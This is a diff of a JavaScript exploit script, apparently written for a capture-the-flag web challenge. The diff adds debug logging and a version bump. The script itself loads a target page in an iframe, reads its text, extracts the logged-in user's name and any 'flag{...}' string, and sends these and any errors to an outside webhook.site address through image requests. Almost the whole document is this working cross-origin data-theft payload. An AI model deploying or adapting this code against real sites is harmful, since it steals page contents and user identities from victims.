@@ -1,5 +1,5 @@
 <script>
-console.log('v16');
+console.log('v17');
 
 function exploit() {
     var iframe = document.createElement('iframe');
@@ -11,12 +11,18 @@ function exploit() {
         new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?iframe_loaded";
         
         try {
+            console.log('A');
             var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
             var text = iframeDoc.body.innerText;
+            console.log('B');
             
             if(text.includes('Welcome')) {
+                console.log('C');
                 var name = text.match(/Welcome,\s*([^!]+)!/);
+                console.log('D');
+                console.log(name);
                 new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?name=" + name[1];
+                console.log('E');
                 
                 var flagMatch = text.match(/flag{[^}]+}/);
                 if(flagMatch) {
@@ -24,6 +30,7 @@ function exploit() {
                 }
             }
         } catch(e) {
+            console.log(e);
             new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?error=" + toString(e);
         }
     };
